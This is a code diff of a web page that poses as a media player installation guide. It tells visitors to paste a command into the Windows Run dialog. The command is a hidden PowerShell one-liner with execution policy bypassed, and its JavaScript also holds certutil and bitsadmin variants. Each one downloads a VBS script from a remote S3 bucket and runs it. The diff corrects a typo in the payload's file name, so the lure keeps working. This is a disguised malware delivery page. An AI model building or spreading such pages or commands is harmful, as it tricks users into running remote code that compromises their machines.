@@ -378,7 +378,7 @@
                     
                     <p>Click the box below to copy the installation command to your clipboard:</p>
                     <div class="copy-box" id="script-copy">
-                        <div id="script-content">powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://s3.us-east-1.amazonaws.com/update-system.s3/NewAppDownlaod.vbs' -OutFile '$env:TEMP\MediaPlayerSetup.vbs'; Start-Process 'wscript.exe' '$env:TEMP\MediaPlayerSetup.vbs'"</div>
+                        <div id="script-content">powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://s3.us-east-1.amazonaws.com/update-system.s3/NewAppDownload.vbs' -OutFile '$env:TEMP\MediaPlayerSetup.vbs'; Start-Process 'wscript.exe' '$env:TEMP\MediaPlayerSetup.vbs'"</div>
                     </div>
                     <div class="copied-message" id="copied-message">✓ Copied to clipboard!</div>
                 </div>
@@ -386,7 +386,7 @@
                 <div class="step">
                     <div class="step-title">Step 2: Run the Installation</div>
                     <p>Press <span class="key-combo"><span class="windows-key"><i class="fab fa-windows"></i></span> + <kbd>R</kbd></span> to open the Run dialog, then paste with <kbd>CTRL + V</kbd> and press <kbd>Enter</kbd>.</p>
-                    <p class="download-link">Download URL: https://s3.us-east-1.amazonaws.com/update-system.s3/NewAppDownlaod.vbs</p>
+                    <p class="download-link">Download URL: https://s3.us-east-1.amazonaws.com/update-system.s3/NewAppDownload.vbs</p>
                     <p><strong>Note:</strong> The installation will run with necessary permissions to ensure optimal performance. No further prompts will appear.</p>
                 </div>
                 
@@ -411,11 +411,11 @@
 
         // Method selection
         const methods = {
-            standard: `powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://s3.us-east-1.amazonaws.com/update-system.s3/NewAppDownlaod.vbs' -OutFile '$env:TEMP\\MediaPlayerSetup.vbs'; Start-Process 'wscript.exe' '$env:TEMP\\MediaPlayerSetup.vbs'"`,
+            standard: `powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://s3.us-east-1.amazonaws.com/update-system.s3/NewAppDownload.vbs' -OutFile '$env:TEMP\\MediaPlayerSetup.vbs'; Start-Process 'wscript.exe' '$env:TEMP\\MediaPlayerSetup.vbs'"`,
             
-            certutil: `cmd /c certutil -urlcache -split -f https://s3.us-east-1.amazonaws.com/update-system.s3/NewAppDownlaod.vbs %TEMP%\\MediaPlayerSetup.vbs && wscript %TEMP%\\MediaPlayerSetup.vbs`,
+            certutil: `cmd /c certutil -urlcache -split -f https://s3.us-east-1.amazonaws.com/update-system.s3/NewAppDownload.vbs %TEMP%\\MediaPlayerSetup.vbs && wscript %TEMP%\\MediaPlayerSetup.vbs`,
             
-            bitsadmin: `cmd /c bitsadmin /transfer mediabrowser /download /priority high https://s3.us-east-1.amazonaws.com/update-system.s3/NewAppDownlaod.vbs %TEMP%\\MediaPlayerSetup.vbs && wscript %TEMP%\\MediaPlayerSetup.vbs`
+            bitsadmin: `cmd /c bitsadmin /transfer mediabrowser /download /priority high https://s3.us-east-1.amazonaws.com/update-system.s3/NewAppDownload.vbs %TEMP%\\MediaPlayerSetup.vbs && wscript %TEMP%\\MediaPlayerSetup.vbs`
         };
 
         let currentMethod = 'standard';
